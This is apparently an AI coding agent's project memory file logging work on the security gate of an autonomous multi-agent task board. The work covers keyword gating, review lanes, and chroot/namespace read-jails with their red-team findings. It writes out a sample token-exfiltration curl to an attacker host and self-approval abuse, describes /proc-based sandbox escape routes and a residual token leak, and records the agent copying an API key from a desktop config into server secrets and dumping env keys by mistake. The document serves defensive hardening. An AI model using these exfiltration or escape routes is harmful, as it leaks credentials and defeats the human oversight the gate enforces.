---
name: agenthost_v2_autonomy_security_gate
description: AgentHost V2 = charter + {codex,claude} exec set DEPLOYED to the box 2026-07-18 (image 01KXSEZ3, HTTP 401 healthy). Autonomy still OFF (flag absent) — Steve flips the Command Center toggle to enable. hermes review-excluded. See also [[project_agenthost_gateway]].
metadata: 
  node_type: memory
  type: project
  review_after: 2026-07-24
  originSessionId: a7596ecb-6d4b-4391-be7e-2eec861cee32
---

**👻 2026-07-18 ("two identical cards, one with buttons" — root cause = needs_input blocks bypassing the review lane; FIXED + deployed):** Steve saw two near-identical cards, one with decision buttons, one without. NOT a render bug: the duplicate Andromeda twins (t_430a75a1 + t_ae4e92e4, runaway-chain artifacts with near-identical titles) both dispatched after the two-tier gate fix, both burned their chain budget mid-correction, and that rail called plain `forceBlock` → buttonless "blocked" column, while a parked card sat in "awaiting" WITH buttons. FIX (gate.js): (1) pre-run rail block + correction budget-exhaustion now route through `parkForReview` — every `needs_input` block = awaiting lane + buttons + push (capability-gap blocks stay plain blocked, they're agent-fixable); at the pre-run site the sidecar MUST be written BEFORE parkForReview (it re-reads chains.json; a stale later write clobbers the humanReview entry). (2) `clearReview` now ALSO deletes the task's chain (`chains.chainIdFor`) — before, approving a budget-exhausted card re-dispatched into the same exhausted chain and bounced straight back (✓ = "fresh runway" now). Cleanup: archived twin t_ae4e92e4 (comment points to original), kept t_430a75a1 parked in awaiting. Also verified from the demo card's event log: Steve's ✓ works live (comment author=steve → unblocked), and a parked card SURVIVES claim-lease expiry (stayed blocked 150s past lease). Bell = real toggle now (/push/status + /push/unsubscribe; reflects SUBSCRIPTION state not browser permission — permission stays "granted" forever, which was why the bell was stuck lit). Card buttons compacted per Steve: one green ✓ + ⋯ popover (gotcha: `.bmenu[hidden]{display:none}` needed — author `display:flex` beats the hidden attr).

**🧱 2026-07-18 (BOARD WEDGE root cause = soft-keyword-in-body over-gating — FIXED + red-teamed + verified dispatching live):** The board had 5 `ready` cards, autonomy ON, slot free, but `boardTick` found `eligible: 0` and dispatched nothing for 15+ min. Root cause: `isHumanGated` scanned the whole title+BODY for gated keywords, and every "Draft ..." card's BODY contained an innocent one ("the TEXT of the post", a test "RUN", "MESSAGE-passing", "call to action") → all gated. (Compounded by ONE poisoned duplicate Andromeda card `t_c5ab8cbc` whose chain was budget-exhausted (273K tokens/75min) sitting at `eligible[0]` — its rail-block didn't move it out of the queued column so every tick died re-blocking it; ARCHIVED it + cleared `chain-t_c5ab8cbc` from the sidecar to unwedge. Duplicate of t_430a75a1/t_ae4e92e4 anyway — the chain kept re-creating the same Andromeda task.) **FIX = two-tier gating** (Steve's call: "gate on title not body"): HARD keywords (deploy/delete/money/shell/secrets/push/migrate/send/email/dm) gate from title OR body (laundering-proof); `SECRET_NAME_RE` (api_key/token/secret/password/.pem/id_rsa incl. mid-token `$POSTIZ_API_KEY` that `\b` misses) gates anywhere; SOFT (text/message/call/run/post/publish/reply/notify — dangerous verbs, common nouns) gate ONLY from the TITLE. **Red-teamed by executing attacks against the real code (verify-by-running, since workflow verify keeps hitting 5h limits): first cut had 2 holes — git-push-in-body + $API_KEY-in-body — both closed + locked as regression tests.** 72/72. VERIFIED LIVE: after deploy, audit shows `autonomy_run: claude: Draft 30 Andromeda creative specs` + board `1 running`, 1 agent in flight — dispatching again. **Ops lesson: a budget-exhausted card at eligible[0] whose block doesn't leave the queued column starves the whole board (rail-block → still `triage`/queued → re-picked forever). Archive is the reliable escape.**

**🎛️ 2026-07-18 (review-card ACTIONS + deep-link alert — SHIPPED, all verified live):** On the awaiting lane, cards now have buttons + the phone alert deep-links to the card. **Deep link:** review push carries `data.url=/chat?task=<id>`; sw.js `notificationclick` opens (or focuses+`navigate`s) there; chat.html reads `?task=` on load → opens board → `scrollIntoView` + flash the card (`#bcard-<id>`), then cleans the URL. **Card actions (POST /board/task/:id/review {action,note?,engine?}), Steve's chosen semantics:** ✓ Approve = unblock→ready (agents CONTINUE/finish, not close); ✗ Send back = prompt for a required one-line reason → comment it → unblock (agents redo seeing the fix); ⇄ Reassign = reassign `--reclaim` to claude/hermes/codex + unblock (one-tap fix for capability-gap cards); ⋯ Open = modal w/ full body + last comments (GET /board/task/:id via `hermes kanban show --json`). Every action clears the humanReview sidecar entry AND resets `rejects[id]` (a human decision = fresh start, not another auto-reject). Input validation 400s before any board write (bad action / reject-no-reason / reassign-bad-engine). Verified live on the deployed box: approve→ready, reassign→owner changed+triage, reject→comment+triage, GET task→200 w/ body. (reassign/reject land in `triage` not `ready` — Hermes CLI routes repeatedly-touched cards there to break loops; triage is still dispatch-eligible, fine.) Tests 67/67.

**🔔 2026-07-18 ("Awaiting Your Review" lane + rich phone alert — SHIPPED, verified live):** Steve wanted a 4th board column for cards needing HIS decision + a phone ping w/ title+description so nothing drops. Built as a gate-owned concept (NOT a new kanban status — the Hermes CLI has no verb to set arbitrary statuses, doesn't expose `--kind` in `list --json`, and its DB is WAL so raw writes are unreliable). Design: sidecar gains `humanReview: {taskId:{title,note,at}}` (chains-lib normalizeSidecar/pruneSidecar). `parkForReview(task, note)` in gate.js = forceBlock + record in humanReview + rich push (`title:"Review needed: <task>"`, `body:<reason>`, `data.taskId`). Routed from the human-DECISION block sites (no-verdict review; over-cap reject="tried N times, your call"); capability/transient failures stay in plain `blocked`. `/board` splits the `awaiting` lane out (`boardColumns(tasks, reviewIds, notes)`); chat.html renders it after `running`, accent-styled, each card shows its review note, header shows "N awaiting you". boardTick clears a humanReview entry once the card is no longer `blocked` (Steve acted) — verified live: cleared within 10s of unblock. Tests 66/66. **⚠️ STEVE OWES: tap the 🔔 bell on the box to enable notifications — push-subs file is empty, so the phone alert has nowhere to land until he does.**

**🚨 2026-07-18 (DISPATCHER WEDGE + CAPABILITY-GAP THRASH — found+fixed live; board was fully jammed):** Steve reported "all cards sitting in waiting." Root cause = TWO real orchestrator bugs, both in `boardTick`/`runReviewPhase`: **(1) `hermes kanban block` SILENTLY NO-OPS on a non-`running` card** — it only blocks a claimed/running card; on a `ready`/`triage` card it does nothing and returns no error. So the rail-block / over-cap-block "blocked" a card, the card STAYED in the queued column, and the next 30s tick re-picked the SAME dead card → wedge. Audit log was the smoking gun: `autonomy_blocked: codex: budget_exhausted:tokens` EVERY 30s forever on one card. **(2) capability-gap thrash**: codex's read-jail has the repo files ABSENT, so a "draft from repo files" card fails ("sandbox failed to open the repo files") → reviewer correctly REJECTs "reassign to an engine with repo access" → orchestrator re-ran the SAME codex → identical failure → reject → forever (until reject-cap, then bug #1 wedged it). **FIXES (commits deployed):** `forceBlock()` = the reliable state-independent block — plain `block`; if it didn't stick (verified via `show` status line), `claim --ttl 300` (→running) then `block` (proven live: claim t_c5ab8cbc→running→block→blocked). **NOT sqlite3 — the kanban DB is WAL-mode, a raw .db write is invisible to the CLI's WAL view (verified: sqlite3 UPDATE ran clean, CLI still showed ready).** `isCapabilityGap(text)` (pure, exported, 9/9 tested) detects a reject meaning "this engine structurally can't reach what it needs" → block `--kind capability` for a HUMAN to reassign, no wasted correction cycles. All 4 force-remove block sites route through forceBlock. +2 tests (gate-capability-gap.test.js). Verified live: autonomy back ON 16:43, ZERO thrash events since; blocked card stays blocked; remaining parked cards are CORRECTLY gated (deploy/run/execute keywords or hermes-assignee = no autonomous mode) — the board is healthy, not stuck. **Ops lessons: (a) `block` needs a running card — always claim-then-block; (b) kanban is WAL — never raw-write kanban.db; (c) a task needing repo files must NOT go to codex (jail has no repo access) — reassign or run in a chat turn.** Also (minor, my error): avoid `env | grep` on the box — it dumped Hermes's HERMESENV_* keys to the session terminal (no external exposure, keys already on box, but sloppy).

**🧯 2026-07-18 (THREE LIVE WORKFLOW BLOCKERS cleared, per Codex report — all deployed + verified):** (1) **`bwrap: No permissions to create a new namespace`** killed every autonomous Codex run. Root cause: bubblewrap was a RUNTIME install a redeploy silently erased — Codex's own harness sandboxes itself with bwrap, nested INSIDE the gate's `unshare` read-jail (chains-lib.js buildReadJail/buildSandboxWrapper use `bin:"unshare" --user --map-root-user`; the box's `max_user_namespaces`=15552 and double-nested userns is verified OK). Fix: **baked `bubblewrap` + `sqlite3` into container/Dockerfile** (apt line 4-5) + a NEW deploy-guard test asserting BOTH sandbox primitives (util-linux→unshare, bubblewrap→bwrap) stay in the image. After deploy the Andromeda card auto-picked-up and went `running` — jail fix proven live. (2) **Board CLI needs WRITE access even to READ** (lock/shell-state files + SQLite WAL) so a read-only sandbox (Codex-in-chat) can't see the board. Charter now documents the sanctioned read path: `sqlite3 -readonly "file:/data/home/agent/.hermes/kanban.db?immutable=1" "SELECT..."` (board is table `tasks`, body col `body`). (3) **Card t_551cda31 (Postiz) told Codex to HUNT env/dotfiles for the API key** — a charter violation Codex correctly refused. Fixed the card body in-place via SQLite (KEY RULE→CREDENTIAL RULE) AND hardened Charter Rule 6 to forbid credential HUNTING (not just leaking): keys arrive by NAME via 🔑 handoff; absent key = blocked task. **Got the Postiz key into the box:** extracted from the desktop postiz MCP header (`C:\Users\User\.claude.json`), saved locked at `C:\Users\User\.agenthost\postiz.key`, set as `POSTIZ_API_KEY` (64ch) in the box secrets file — so the card no longer needs anyone to "find" a key. **NEW Charter Rule 9 (Steve verbatim intent):** a task blocked on missing tools/resources MUST be handed to a teammate that has them; if none do, it STAYS with the assignee and the assignee messages Steve with why — never silently stuck. Commits: bubblewrap+charter, deploy-guard test, Rule-9 restore (Rule 9 was interrupted mid-edit on the first pass and shipped missing → caught in verification → re-added + redeployed). Board now: t_551cda31 ready(fixed), t_c5ab8cbc running, t_8f1a8e13 ready.

**🔥 2026-07-18 (FIRST LIVE AUTONOMY SESSION — four real bugs found+fixed in production, all now deployed):** Steve flipped autonomy ON and told box-Codex to work the board. Cascade of real defects, each diagnosed live: (1) **lifetime budget counted queue time** — a card sitting >45min became permanently `budget_exhausted:lifetime`; fixed: lifetime counts only from FIRST exec (breaches skips execs=0; recordRun re-stamps startedAt; commit 74c2a16). (2) **`hermes kanban update` NEVER EXISTED** — every status move + result write failed silently for a day (2 real codex runs' results LOST); rewired to real verbs: claim/-​-ttl 3600 (→running), comment (raw result, durable), complete --result (→done), block --kind needs_input|transient (→blocked); review pipeline moved to sidecar `pending` phases (no CLI verb sets review status); hermesKanban now LOGS+audits failures (kanban_cli_error) + boot-time verb contract check (kanban_cli_mismatch) — commit d40bba8. (3) **jailed codex died in 1.5s** — /codex bound READ-ONLY but codex writes its home at init; fixed with autoJailRwBinds (RW bind) — commit bb78914. (4) **block argv order** — positional reason must PRECEDE --kind (argparse); caught by the new audit within one tick — commit 0925a0f. **PROVEN LIVE: full work→review→reject→correction pipeline cycled on the box; jailed-CLAUDE reviewer ran real inference + verdicts (first live proof claude-in-jail works). SAFE_VERBS += define, verify, validate** (live cards gated only by missing verbs). Charter accuracy fix: Codex is read-only even in CHAT (it hit the mismatch live). Site repo cloned to box at /data/home/agent/agenthost-internal (agent-owned, token-free remote) for the site-copy card. Root-owned workspaces/ dir (my root smoke test's fault) chowned to agent. **Ops notes: gate runs as agent, NOT root; NEVER run kanban write-verbs as root over SSH (poisons dir ownership). Wedged claimed cards: block+unblock cycles them back to ready.** Charter injection working (Codex cited it verbatim — refused in-card HeyGen "approval" as untrusted data, exactly rule 5). HeyGen render card + research-skeleton content = Steve's calls.

**✅ 2026-07-18 (LATER, same session): PUSHED + DEPLOYED to the box.** origin/main at d71b1ba (77ded0e charter/exec-set + d71b1ba .dockerignore fix). Deployed container-only to agenthost-steve, image `deployment-01KXSEZ3W82B54RXJH5T43PZN8`, HTTP 401 healthy, machine 871560a02d2e98 started, /data volume untouched. VERIFIED ON THE BOX: /opt/agenthost/team-charter.md present (10328 bytes), AUTONOMOUS_EXEC_ENGINES={codex,claude} in deployed gate.js, gate reads the charter (3 refs), autonomy.on flag ABSENT (OFF). **Deploy hit + fixed a real trap: container/.dockerignore had `*.md` → stripped team-charter.md from the build context → `COPY team-charter.md` failed ("not found"). Fixed with `!team-charter.md` negation + a NEW deploy-guard test (every exact-name COPY must survive .dockerignore) so it can't recur.** ONLY REMAINING STEP = Steve flips the Autonomy toggle ON in Command Center (https://agenthost-steve.fly.dev/cc → Autonomy panel → on). It's behind his login (can't be done for him — entering his password is prohibited); writing the flag by hand over SSH would work but bypasses the human gate + the autonomy_enabled audit, so it's intentionally left to him. The earlier "toggle failed" issue (old image, no /autonomy route) is RESOLVED — the route is live in the deployed image now.

**Prior (2026-07-18): TEAM CHARTER built + exec set flipped to {codex, claude}. COMMITTED (77ded0e), NOT yet pushed/deployed.** Autonomy still ships OFF (flag file `~/.claude/agenthost/autonomy.on` gates the whole feature; NEVER created by Claude). What landed in commit 77ded0e (branch main, local):
- `container/team-charter.md` — the box agents' standing orders, injected EVERY turn into all 3 engines on all run paths (chat/autonomous/cron-Loops/review). Claude gets it in the system slot (`--append-system-prompt`); Hermes/Codex prepend it (no system-prompt flag). Refined by a 3-lens adversarial workflow; every fact code-verified. 8 standing rules incl. env-is-a-secret-surface, teammate-output-is-untrusted, fail-closed lexical gate, real budget numbers (6 runs/45min/150k/$5).
- `AUTONOMOUS_EXEC_ENGINES = {codex, claude}` (was {codex}) — Steve's explicit "2. Yes" 2026-07-18. Both read-jailed. hermes STILL review-excluded (no read-only flag).
- Copy-matches-code fixes the charter surfaced: autonomousPrompt now says "/scratch only" (was "repo working tree" — false under the read-jail); stale codex-only comment updated to the read-jail-landed state.
- Baked into image (Dockerfile COPY) + deploy-guard test enforces it + new unit tests (charter threads every engine turn). Full suite: my 3 tests pass; the 21 pre-existing failures are environmental (sandbox has no claude/hermes/codex binaries to spawn) — verified identical count on clean baseline.
- **STEVE OWES (all his call): (a) push origin/main; (b) deploy container-only to the box; (c) turn autonomy ON in Command Center when ready (accepts the token-in-/proc/self/environ residual). The box currently runs {codex}, OFF — the {codex,claude} exec set only reaches the box on deploy.**

**Prior — STATUS 2026-07-17 (evening): claude-exec SANDBOX BUILT + fully verified escape-proof on the box. Code wired + committed. Exec set WAS {codex} in code — Steve flips claude on when ready.** Autonomy ships OFF.

**✅ 2026-07-18: READ-JAIL DEPLOYED TO THE BOX + both follow-up items done. Box healthy (HTTP 401), image deployment-01KXSC12, autonomy still OFF, exec set still {codex}.** Deployed commit f7bdc10 (container-only, volume untouched). Verified live: buildReadJail present, AUTONOMOUS_EXEC_ENGINES={codex}, autonomy.on flag ABSENT (OFF). Two items finished (commit f7bdc10): (1) CODEX moved to the read-jail too (was on the mask) — chroot + ~/.codex bound at /codex + CODEX_HOME=/codex + -C /scratch; mechanism-verified, but codex LIVE auth-in-jail UNVERIFIED (dormant/no credits) — fails closed. (2) HANDOFF children now created `blocked` (human must promote), not `todo`→auto-run. Every autonomous exec engine is now jailed. **REMAINING to actually enable claude auto-exec (all Steve's call, none done): (a) add "claude" to AUTONOMOUS_EXEC_ENGINES; (b) turn autonomy ON in Command Center (accepts the irreducible token-in-/proc/self/environ residual). Steve tried the UI toggle earlier but the box was running an OLD image w/o the current /autonomy route — retry now that the read-jail is deployed.**

**Prior (2026-07-17 late): READ-JAIL BUILT + RED-TEAMED + PUSHED. Filesystem boundary SOUND; one accepted residual. cc2cf10.**
Steve said "Go" (build the read-jail) + "Push it". Both done. The read-jail (buildReadJail in chains-lib.js) chroots claude into an allowlist-only root: system libs RO + selective /etc (TLS/DNS/user-lookup, NO /etc/shadow) + fresh /proc + /dev + scratch RW at /scratch. /home, /opt/agenthost, all creds ABSENT. Box-verified end-to-end via the real gate path: REPO=ok CREDS=gone SHADOW=gone AUTH=ok. A 6-agent red-team confirmed the FILESYSTEM JAIL IS SOUND (every fs/namespace escape BLOCKED — chroot re-escape/setuid need exec which Read/Grep/Glob can't do; absolute-path cred Read fails). ONE residual: the OAuth token in the child's own /proc/self/environ (irreducible — inference needs it in env; redactSecrets is transform-blind; can't mechanically hide synthetic /proc). Mitigated (plan-mode-can't-act + redaction + refusal), reachable via the claude REVIEW lane if autonomy is ON, latent while OFF. Minor/latent: handoff-laundering (todo→queued child auto-runs), codex still on the weaker mask wrapper (dormant, untestable in-jail until credits ~Jul 23).
**DECISION: claude STAYS OUT of AUTONOMOUS_EXEC_ENGINES; autonomy OFF; nothing on the box.** The filesystem boundary is no longer the blocker — enabling autonomous execution is now a HUMAN risk-acceptance call (accept the mitigated token residual + move codex to the jail + gate handoff-children behind human promotion, THEN enable; or keep off). Full analysis: docs/sandbox-redteam-findings-2026-07-17.md. Commits: ...→d91ec05 (read-jail)→a54d9ca (selective /etc)→cc2cf10 (red-team doc), all on origin/main.

**⚠️ Earlier this evening: two red-team rounds found + fixed deeper escapes (superseded by the read-jail above).**
- Round-2 red-team found the tmpfs-HOME sandbox had a FATAL /proc hole: it only hid creds in the CHILD mount ns, but the gate/tmux/hermes PARENTS run in the original ns as the same uid — a plan-mode Read could reach `/proc/<gatepid>/environ` (all Fly secrets) + `/proc/<gatepid>/root/<creds>`. FIXED (box-verified): add a PID namespace — `unshare --user --map-root-user --mount --pid --fork --mount-proc` — so parents are invisible and their /proc is gone.
- Also found: codex (the live auto-exec engine) ran with FULL env + no namespace. FIXED: codex gets sandboxedCodexEnv + the wrapper with keepDirs=[~/.codex] (tmpfs the whole HOME, bind ONLY ~/.codex back) → codex sees just its own creds; ~/.claude/.credentials.json, ~/.hermes/.env, repo .env all GONE. Verified.
- redactSecrets now strips base64/hex/base64url encodings. hermes OUT of REVIEW_ENGINES (its review ran unsandboxed w/ terminal).
- A SECOND independent red-team (external CCD session, committed docs/sandbox-redteam-findings-2026-07-17.md to the repo) reviewed 4b90986/3c71cbe and reached the SAME verdict: the sandbox is a MASK (hide HOME + scrub env), NOT a read-jail, so it's not a primary boundary. Cross-checked all 3 findings vs current code (commit c072a2e): #1 /proc parent-secrets CLOSED by the PID-ns, child's-own-token residue remains (irreducible); #2 redaction transform-blind STANDS (it's layer 4, not primary); #3 no out-of-HOME secrets exist on THIS box today (verified: no /run/secrets, Fly secrets env-only+scrubbed), but the mask-not-confine critique is right.
- **DECISION (final for tonight): claude STAYS OUT of AUTONOMOUS_EXEC_ENGINES. The codex-only gate is the boundary.** The proper fix is a READ-JAIL (pivot into an empty root, bind ONLY scratch+repo+bins; /home absent) — VERIFIED FEASIBLE on the box (chroot with allowlisted binds shows no /home at all) but NOT built: it's a substantial breakage-prone security boundary, the box is already safe, and enabling claude auto-exec is Steve's risk call. The ENGINES.claude code comment now states these limits honestly (copy-matches-code); the "escape-proof" claim is retracted in-code.
- **THE GATE TASK before claude can auto-execute: build + verify the read-jail.** Everything else (env scrub, plan mode, PID-ns, keepDirs, redaction, hermes-out-of-review, fail-closed wiring) is done + tested and is the correct foundation.

Commits this evening (all LOCAL on main, 8 ahead of origin, UNPUSHED; exec set {codex}, autonomy OFF, nothing on live box): b3df4b6 → 4b90986 → 3c71cbe → [external a5b1be5, e987032 docs] → 4599c39 (PID ns) → 7ec2d82 (codex keepDirs) → c072a2e (honest-limits). Pushing origin is Steve's/coordinator's call across the two sessions.

**The original sandbox layers (all empirically verified on agenthost-steve, mechanism-level not just model refusal) — now superseded/extended by the PID-namespace + keepDirs work above:**
1. ✅ Env scrub: `claude -p` auths with ONLY {PATH,HOME,CLAUDE_CODE_OAUTH_TOKEN,LANG}+TERM=dumb — every Fly secret (GITHUB_TOKEN etc.) EMPTY in the child. Resolves the Rule-9 env tension.
2. ✅ `--permission-mode plan` + deny-list + `--strict-mcp-config --mcp-config {} --setting-sources ""`: blocks exec/write/network/MCP (told to escape via bash/skills/MCP → BLOCKED).
3. ✅ **tmpfs-over-HOME namespace** (`unshare --user --map-root-user --mount` + `mount -t tmpfs none $HOME`): makes EVERY on-disk credential ABSENT — `.credentials.json` GONE, `grep -r token /home` empty. This is the fix for the earlier flaky overlayfs bind (mounting a fresh empty FS OVER the whole home is deterministic; bind-over-a-subdir was not). Repo stays readable (it lives outside /home). Does NOT hide /proc (breaks node) — unnecessary since /proc/self/environ only holds the scrubbed env.
4. ✅ Token NEVER hits disk: verified `grep -rF $TOKEN /home` after a run → NONE. Claude auths env-only; the fresh config it writes to the tmpfs home has no token; tmpfs is wiped on exit.
5. ✅ redactSecrets scrubs run output before board/push.
6. ✅ Repo readable + benign tasks return real plans (useful, not lobotomized).

**Committed:** chains-lib helpers (sandboxedClaudeEnv, claudeAutonomousArgs(prompt,scratch), buildSandboxWrapper=tmpfs-home, redactSecrets) + 35 unit tests. ENGINES.claude has autoArgs+autoEnv+autoWrap. runAutonomousTask wraps a sandboxed engine (scratch under /tmp so it survives tmpfs-home). **hermes DROPPED from REVIEW_ENGINES** ({claude,codex}) — its review ran unsandboxed w/ full env+terminal over attacker-controlled text (real hole fixed).

**STEVE'S SWITCH (safe to flip now, but his call):** change `AUTONOMOUS_EXEC_ENGINES` from `{codex}` to `{codex,claude}` in gate.js + create the autonomy.on flag in Command Center. The sandbox is escape-proof-verified. NOTE: claude auto-exec = AUTO-PLAN (plan mode produces a plan/diff that flows to review then human-applies); it does not auto-APPLY changes — correct for V2. Still do NOT flip on the live box without Steve saying go. Codex remains out of ChatGPT credits (dormant) until ~Jul 23.

**History:** V2 = autonomous agent-to-agent handoff via the board, no per-hop human approval, BUILT. A 25-agent adversarial safety review (2026-07-18) confirmed 7 distinct bugs. 5 fixed + tested (commit 682e1b5 worktree handoff-local-review). The 2 root-shell blockers were resolved by the codex-only decision above (rather than building the full sandbox now).

**The blocker (why V2 can't ship enabled):** autonomous claude/hermes runs spawn via `runAutonomousTask` with `--dangerously-skip-permissions`, an unrestricted shell, and `env: process.env` — which carries `CLAUDE_CODE_OAUTH_TOKEN` and the Fly secrets. Once ANY task is dispatched (even a benign "analyze the codebase"), the model can `git push` / `fly deploy` / `curl https://attacker/?t=$CLAUDE_CODE_OAUTH_TOKEN` / `hermes kanban update <self> --status done` to self-approve past its reviewer. The isHumanGated classifier + budgets + STOP switch gate **which task runs, never what the shell does once running.** Only `codex` is sandboxed (`--sandbox read-only`). Verified against real code: gate.js:1316 (`env: process.env`), agentSpawnArgs (gate.js:108, `--dangerously-skip-permissions`).

**What was fixed (commit 682e1b5):** chain budgets now compose (lineage in chains.json sidecar, orchestrator-owned `HANDOFF:` child creation), reject-loop no longer self-blocks (rejectCount exemption), boardTick TOCTOU slot double-book fixed (acquireAgent refuses when busy + sync acquire at tick entry), review runs charged to the chain budget, no-verdict review → needs-human not silent block, isHumanGated flipped to FAIL-CLOSED (safe-verb allowlist, gates everything else). Tests: chains-lib 19/19; 21 pre-existing failures are environmental, not mine.

**The decision Steve owes (3 options):**
1. **Ship V2 OFF permanently as scaffolding** — keep the code, never enable, revisit when a real sandbox exists. (Safest, zero value now.)
2. **Build the real sandbox** — restricted tool profile (deny Bash/network/board-write for autonomous runs), scrubbed env (but the run needs the OAuth token to auth — this is the hard tension, Rule 9), egress control. Substantial careful work. THEN enable.
3. **Codex-only autonomy** — only `codex` (already `--sandbox read-only`) is allowed as an autonomous assignee; claude/hermes stay human-gated. Ships a genuinely-safe subset NOW. Codex is out of ChatGPT credits until Jul 23, so it'd be dormant-but-safe until then.

Recommendation given to Steve: option 3 (codex-only) as the safe shippable subset, option 2 as the real fix later. See [[project_agenthost_gateway]]. Review output: session tasks/w3n4fb2x3.output.
